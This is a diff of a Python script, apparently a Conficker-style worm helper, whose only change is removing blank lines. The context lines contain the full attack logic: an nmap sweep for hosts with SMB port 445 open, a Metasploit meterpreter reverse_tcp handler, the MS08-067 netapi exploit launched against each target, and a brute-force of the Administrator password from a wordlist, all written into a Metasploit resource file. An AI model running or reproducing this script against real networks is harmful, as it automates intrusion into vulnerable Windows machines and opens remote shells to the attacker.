@@ -2,7 +2,6 @@ import os
 import argparse
 import nmap
 
-
 def find_tgts(subnet):
     nmap_scan = nmap.PortScanner()
     nmap_scan.scan(subnet, '445')
@@ -15,7 +14,6 @@ def find_tgts(subnet):
                 hosts.append(host)
     return hosts
 
-
 def setup_handler(config_file, lhost, lport):
     config_file.write('use exploit/multi/handler\n')
     config_file.write('set payload windows/meterpreter/reverse_tcp\n')
@@ -24,7 +22,6 @@ def setup_handler(config_file, lhost, lport):
     config_file.write('exploit -j -z\n')
     config_file.write('setg DisablePayloadHandler 1\n')
 
-
 def conficker_exploit(config_file, host, lhost, lport):
     config_file.write('use exploit/windows/smb/ms08_067_netapi\n')
     config_file.write(f'set RHOST {str(host)}\n')
@@ -32,7 +29,6 @@ def conficker_exploit(config_file, host, lhost, lport):
     config_file.write(f'set LPORT {str(lport)}\n')
     config_file.write(f'set LHOST {lhost}\n')
     config_file.write('exploit -j -z\n')
-
 
 def smb_brute(config_file, host, passwd_file, lhost, lport):
     username = 'Administrator'
@@ -47,7 +43,6 @@ def smb_brute(config_file, host, passwd_file, lhost, lport):
             config_file.write(f'set LPORT {str(lport)}\n')
             config_file.write(f'set LHOST {lhost}\n')
             config_file.write('exploit -j -z\n')
-
 
 if __name__ == '__main__':
     with open('meta.rc', 'w') as metarc_file:
